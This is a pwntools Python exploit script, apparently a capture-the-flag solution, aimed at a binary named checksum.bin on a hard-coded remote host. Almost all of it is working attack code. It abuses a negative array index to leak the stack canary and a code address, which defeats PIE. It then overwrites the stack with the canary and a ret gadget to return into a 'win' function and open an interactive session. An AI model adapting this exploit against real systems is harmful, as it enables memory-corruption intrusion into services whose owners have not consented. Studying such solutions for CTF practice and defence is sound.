#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 34.143.157.242 --port 8072 ./checksum.bin
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./checksum.bin')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '34.143.157.242'
port = int(args.PORT or 8072)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled


def get_negative_index(byte_offset):
    target_number = ((1 << 63) | (byte_offset // 8))
    negative_index = (u64(p64(target_number), sign="signed"))
    return negative_index


def read_local_value(rbp_offset):
    """rbp_offset is positive, so if looking for [rbp-8] give 8 as the arg"""
    byte_offset = 0x90 - rbp_offset
    negative_index = get_negative_index(byte_offset)

    io.recvuntil(b'opt >> ')
    io.sendline(b'1')

    io.recvuntil(b'idx >> ')
    io.sendline(f'{negative_index}'.encode())

    io.recvuntil(b'<< ')
    local_value = int(io.recvline(keepends=False).decode('utf-8'))

    return local_value


def write_bytes(uint_value):
    io.recvuntil(b'opt >> ')
    io.sendline(b'2')

    io.recvuntil(b'x >> ')
    io.sendline(f'{uint_value}'.encode())


io = start()

rop = ROP(exe)
ret = rop.ret.address

canary_value = read_local_value(8)
start_addr = read_local_value(0x18)

win_addr = (start_addr & 0xfffffffffffff000) | (exe.symbols['win'] & 0xfff)
ret_addr = (start_addr & 0xfffffffffffff000) | (ret & 0xfff)

for _ in range((0x98 // 8)):
    write_bytes(canary_value)

write_bytes(ret_addr)
write_bytes(win_addr)
write_bytes(1337)

io.interactive()
